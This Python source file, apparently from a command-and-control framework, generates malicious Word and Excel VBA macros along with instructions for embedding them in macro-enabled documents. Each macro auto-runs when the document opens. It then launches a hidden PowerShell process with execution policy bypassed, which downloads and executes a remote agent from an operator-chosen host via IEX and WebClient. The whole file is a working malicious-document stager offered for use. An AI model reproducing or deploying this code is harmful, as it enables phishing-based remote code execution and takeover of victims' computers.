import os

def generate_word_macro_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    
    # Generate a VBA macro for Word
    macro_code = f"""
    Sub AutoOpen()
        ' Auto-execute when the document is opened
        ExecuteAgent
    End Sub

    Sub Document_Open()
        ' Auto-execute when the document is opened (alternative method)
        ExecuteAgent
    End Sub

    Sub ExecuteAgent()
        ' Execute the agent via PowerShell
        
        ' Hide PowerShell window
        Dim windowStyle As Integer
        windowStyle = 0 ' Hidden window
        
        ' Create the PowerShell command
        Dim command As String
        command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""&{{IEX(New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}')}}"" "
        
        ' Execute the command
        Dim result As Integer
        result = Shell(command, windowStyle)
    End Sub
    """
    
    # Save the macro to a file
    macro_file_path = os.path.join(agents_folder, "Word_macro.vba")
    with open(macro_file_path, "w") as f:
        f.write(macro_code)
    
    # Create instructions for using the macro
    instructions = f"""
    Word Macro Agent Instructions:
    
    1. Open Microsoft Word
    2. Press Alt+F11 to open the VBA editor
    3. Right-click on "ThisDocument" in the Project Explorer
    4. Select "Insert" > "Module"
    5. Paste the following code into the module:
    
    {macro_code}
    
    6. Save the document as a macro-enabled document (.docm)
    7. When the document is opened, it will connect to: {http}://{host}:{port}{raw_agent}
    """
    
    instruction_file_path = os.path.join(agents_folder, "Word_macro_instructions.txt")
    with open(instruction_file_path, "w") as f:
        f.write(instructions)
    
    result = f"Word Macro agent generated and saved to {macro_file_path}\nInstructions saved to {instruction_file_path}"
    return result

def generate_excel_macro_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    
    # Generate a VBA macro for Excel
    macro_code = f"""
    Sub Auto_Open()
        ' Auto-execute when the workbook is opened
        ExecuteAgent
    End Sub

    Sub Workbook_Open()
        ' Auto-execute when the workbook is opened (alternative method)
        ExecuteAgent
    End Sub

    Sub ExecuteAgent()
        ' Execute the agent via PowerShell
        
        ' Hide PowerShell window
        Dim windowStyle As Integer
        windowStyle = 0 ' Hidden window
        
        ' Create the PowerShell command
        Dim command As String
        command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""&{{IEX(New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}')}}"" "
        
        ' Execute the command
        Dim result As Integer
        result = Shell(command, windowStyle)
    End Sub
    """
    
    # Save the macro to a file
    macro_file_path = os.path.join(agents_folder, "Excel_macro.vba")
    with open(macro_file_path, "w") as f:
        f.write(macro_code)
    
    # Create instructions for using the macro
    instructions = f"""
    Excel Macro Agent Instructions:
    
    1. Open Microsoft Excel
    2. Press Alt+F11 to open the VBA editor
    3. Right-click on "ThisWorkbook" in the Project Explorer
    4. Select "Insert" > "Module"
    5. Paste the following code into the module:
    
    {macro_code}
    
    6. Save the workbook as a macro-enabled workbook (.xlsm)
    7. When the workbook is opened, it will connect to: {http}://{host}:{port}{raw_agent}
    """
    
    instruction_file_path = os.path.join(agents_folder, "Excel_macro_instructions.txt")
    with open(instruction_file_path, "w") as f:
        f.write(instructions)
    
    result = f"Excel Macro agent generated and saved to {macro_file_path}\nInstructions saved to {instruction_file_path}"
    return result